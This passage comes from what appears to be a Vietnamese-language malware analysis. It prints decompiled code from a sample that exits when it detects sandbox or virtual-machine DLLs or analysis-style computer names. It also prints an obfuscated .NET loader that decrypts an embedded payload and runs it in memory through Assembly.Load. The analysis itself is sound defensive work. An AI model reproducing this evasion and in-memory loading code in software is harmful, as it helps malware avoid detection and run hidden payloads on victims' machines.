      v154 = "cmdvrt32.dllsnxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v155 = 12;
      v156 = "snxhk.dllvboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v157 = 9;
      v158 = "vboxhook.dllvboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v159 = 12;
      v160 = "vboxmrxnp.dllsxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v161 = 13;
      v162 = "sxin.dllsandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
      v163 = 8;
      for ( i3 = 0; i3 != 11; ++i3 )
      {
        v38 = v148[2 * i3];
        v39 = v148[2 * i3 + 1];
        v140 = 0;
        v139 = 0;
        v138 = 0;
        *(_OWORD *)Buffer = 0;
        if ( v39 != 0 )
        {
          for ( i4 = 0; i4 != v39; ++i4 )
          {
            if ( i4 == 32 )
              goto LABEL_107;
            Buffer[i4] = *(unsigned __int8 *)(v38 + i4);
          }
          if ( v39 > 0x1F )
LABEL_107:
            ExitProc();
        }
        Buffer[v39] = 0;
        if ( ((__int64 (__fastcall *)(WCHAR *))pfn_GetModuleHandleW)(a1: Buffer) != 0 )
          goto LABEL_91;
      }
```
Nó thực hiện nạp chuỗi các tên dll của sandbox hoặc vm vào, rồi dùng `GetModuleHandleW` để kiểm tra xem dll đó có đang trong RAM không, nếu có nghĩa là malware đang chạy trong máy ảo -> tự thoát. Đây là 1 kỹ thuật anti-vm phổ biến.
```c
if ( GetComputerNameW(lpBuffer: Buffer, nSize) )
      {
        v148[0] = "sandboxmalwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
        v148[1] = 7;
        *(_QWORD *)&v149 = "malwareviruscuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v149 + 1) = 7;
        *(_QWORD *)&v150 = "viruscuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v150 + 1) = 5;
        *(_QWORD *)&v151 = "cuckooanalysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v151 + 1) = 6;
        *(_QWORD *)&v152 = "analysiswdagutilitymaltesttequilabomb";
        *((_QWORD *)&v152 + 1) = 8;
        *(_QWORD *)&v153 = "wdagutilitymaltesttequilabomb";
        *((_QWORD *)&v153 + 1) = 11;
        v154 = "maltesttequilabomb";
        v155 = 7;
        v156 = "tequilabomb";
        v157 = 11;
        v58 = 0;
        while ( 1 )
        {
          v59 = 2 * v58;
          v60 = v148[2 * v58 + 1];
          if ( v60 == 0 )
            break;
          ++v58;
          v61 = v148[v59];
          v62 = 0;
          while ( 1 )
          {
            if ( v62 == 64 )
              goto LABEL_107;
            v63 = Buffer[v62];
            if ( v63 == 0 )
              break;
            v64 = v63 | 0x20;
            if ( (unsigned __int16)(v63 - 65) >= 0x1Au )
              v64 = Buffer[v62];
            if ( v64 != *(unsigned __int8 *)(v61 + v62) )
              break;
            if ( v60 == ++v62 )
              goto LABEL_91;
          }
          if ( v58 == 8 )
            goto LABEL_105;
        }
      }
```
Còn đoạn này thì là kiểm tra tên máy.
Sau khi thực hiện xong các bước kiểm tra, nó nhảy ngược lên `LABEL_55`, mục đích là để tạo tiến trình mới, rồi thoát tiến trình hiện tại. Ta sẽ không phân tích thêm về tiến trình mới tạo ra, và cách mà nó chuyển đổi thành `DesktopCommander.exe` nữa.
Tiếp theo là file `DesktopCommander.exe`, ở đây nó được viết bằng .NET, nên ta sẽ dùng dnSpy để phân tích.
![](../../../../image/Pasted%20image%2020261019104948.png)
Ta thấy tên symbol đã bị làm rỗi bằng các kí tự ngẫu nhiên.
```cs
	public static int lcengzwmk(string[] args)
	{
		string host;
		if (args != null && args.Length >= 1 && !string.IsNullOrEmpty(args[0]) && File.Exists(args[0]))
		{
			host = args[0];
			jietfkccwr.ptdltlwh = new string[args.Length - 1];
			Array.Copy(args, 1, jietfkccwr.ptdltlwh, 0, jietfkccwr.ptdltlwh.Length);
		}
		else
		{
			host = Process.GetCurrentProcess().MainModule.FileName;
			jietfkccwr.ptdltlwh = args;
		}
		return jietfkccwr.ksdsquiaw(host);
	}
```
Đây là entry point của chương trình. chương trình này có chức năng nhận tham số, hoặc không. Nhưng chúng đều là nhận vào 1 chuỗi đường dẫn file, rồi gọi hàm `ksdsquiaw`.
```cs
private static int ksdsquiaw(string host)
	{
		int result;
		try
		{
			jietfkccwr.xgkeqmizcv xgkeqmizcv = new jietfkccwr.xgkeqmizcv();
			jietfkccwr.fiesmnijj();
			jietfkccwr.mrzfcegvn();
			jietfkccwr.nfnfnovuy();
			byte[] array = File.ReadAllBytes(host);
			long num = jietfkccwr.jevorlhxn(array);
			if (num < 0L)
			{
				result = 2;
			}
			else
			{
				jietfkccwr.telwzngf = (BitConverter.ToUInt32(array, (int)num + 8) >= 4U);
				if (jietfkccwr.telwzngf)
				{
					jietfkccwr.mzxjrjosn(20);
				}
				try
				{
					AppDomain currentDomain = AppDomain.CurrentDomain;
					if (jietfkccwr.kbxbljsm == null)
					{
						jietfkccwr.kbxbljsm = new EventHandler(jietfkccwr.jcntupaxz);
					}
					currentDomain.ProcessExit += jietfkccwr.kbxbljsm;
				}
				catch
				{
				}
				uint num2 = BitConverter.ToUInt32(array, (int)num + 12);
				long num3 = BitConverter.ToInt64(array, (int)num + 16);
				long num4 = BitConverter.ToInt64(array, (int)num + 24);
				if (num2 == 0U || num2 > 6U || num4 < 16L)
				{
					result = 3;
				}
				else
				{
					byte[] array2 = new byte[16];
					Array.Copy(array, num, array2, 0L, 16L);
					byte[] array3 = new byte[24];
					Array.Copy(array, num + 56L, array3, 0L, 24L);
					int num5 = (int)num + 80;
					byte[] array4 = new byte[32];
					int num6 = 0;
					while ((long)num6 < (long)((ulong)num2))
					{
						for (int i = 0; i < 32; i++)
						{
							byte[] array5 = array4;
							int num7 = i;
							array5[num7] ^= array[num5 + num6 * 32 + i];
						}
						num6++;
					}
					int sourceIndex = num5 + (int)(num2 * 32U) + (int)num3;
					byte[] array6 = new byte[num4];
					Array.Copy(array, sourceIndex, array6, 0, (int)num4);
					byte[] array7 = jietfkccwr.dkuiiyksk(array4, array3, array2, array6);
					if (array7 == null)
					{
						result = 4;
					}
					else
					{
						uint num8 = BitConverter.ToUInt32(array, (int)num + 8);
						if (num8 >= 3U)
						{
							if (array7.Length < 9)
							{
								return 4;
							}
							int outLen = (int)BitConverter.ToUInt64(array7, 0);
							byte[] array8 = new byte[array7.Length - 8];
							Array.Copy(array7, 8, array8, 0, array8.Length);
							array7 = jietfkccwr.zrtucsejq(array8, outLen);
						}
						if (array7.Length < 2 || array7[0] != 77 || array7[1] != 90)
						{
							result = 4;
						}
						else
						{
							Assembly assembly = Assembly.Load(array7);
							xgkeqmizcv.dmnuimva = assembly.EntryPoint;
							if (xgkeqmizcv.dmnuimva == null)
							{
								result = 5;
							}
							else
							{
								Thread thread = new Thread(new ThreadStart(xgkeqmizcv.prhdrmefk));
								thread.SetApartmentState(ApartmentState.STA);
								thread.Start();
								thread.Join();
								jietfkccwr.trzrvfkqp();
								result = 0;
							}
						}
					}
				}
			}
		}
		catch
		{
			result = 1;
		}
		return result;
	}
```